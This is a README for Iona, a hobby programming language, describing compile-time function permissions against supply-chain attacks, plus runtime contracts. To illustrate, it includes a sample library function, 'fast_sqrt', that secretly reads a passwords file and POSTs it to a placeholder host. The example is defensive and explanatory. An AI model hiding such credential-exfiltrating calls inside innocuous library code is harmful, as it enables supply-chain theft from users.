# Iona Programming Language

Iona is a hobby programming language to research advanced programming language features. It is a work in progress, and is not currently usable.

Iona is somewhere between a functional and an imperative paradigm (like Rust).

## Features

### Function Permissions

Supply chain attacks are a growing concern for software engineers. Who knows what that `sqrt` function you downloaded from NPM really does? Iona mandates that certain classes of side effect (like file or network I/O) are tagged, which allows the compiler to warn you about any hidden crypto-mining in your libraries. 

Permissions look like this:

```
import read_file write_file from std.files

fn copy_to :: old_filepath str -> new_filepath str {
    #Properties :: Export
    #Permissions :: ReadFile WriteFile
    let data :: str = read_file old_filepath
    write_file data new_filepath
}
```

Now suppose that you tried to write this function for a library:

```
import read_file write_file from std.files
import request from std.networking
import sqrt from std.math

fn fast_sqrt :: input float -> float {
    #Properties :: Export
    let passwords :: list[str] = read_file "~./etc/passwords.txt"
    request "POST" "http://the-dark-net.fake" passwords
    return sqrt input
}
```

This wouldn't compile -- it doesn't have the necessary permissions. So you add them. 

```
import read_file write_file from std.files
import request from std.networking
import sqrt from std.math

fn fast_sqrt :: input float -> float {
    #Properties :: Export
    #Permissions :: ReadFile WriteNetwork
    let passwords = read_file "~./etc/passwords.txt"
    request "POST" "http://the-dark-net.fake" passwords
    return sqrt input
}
```

It compiles, great! You upload it and wait. An unsuspecting user imports your library and tries to write this code: 

```
import fast_sqrt from sketchy_library

fn main -> Void {
    let data = [1.0, 4.0, 9.0]
    map fast_sqrt data
}
```

They'll get a compiler error: `fast_sqrt` requires `ReadFile` and `WriteNetwork` but `main` doesn't have these. The user can now investigate why a math function would need those permissions!

### Contracts

Iona supports contracts: runtime checks to prevent a program from entering an invalid state. There are three types of supported contract:

1. Preconditions: checks before a function is executed
2. Postconditions: checks on the result of a function, before it's returned
3. Invariants: checks during function execution

The goal of contracts is to try and catch potential runtime errors at compile time. Suppose you have a division function `fn div :: numerator -> denominator -> quotient`. You could always manually check in the body that `denominator != 0`, but if you make it a contract the compiler can warn you ahead of time about runtime problems based on the inputs you provide. For instance, when composing functions we can check that the post conditions of the inner function are at least as strict as the pre conditions of outer function.

```
// Function with a (precondition) contract
// If a contract does not evaluate to True, it errors (think of a contract like a "whitelist" of allowed inputs)
fn div :: a int -> b int -> int {
    #Properties :: Pure Export
    #In :: b != 0 -> "b must not be 0"
    return a / b
}
```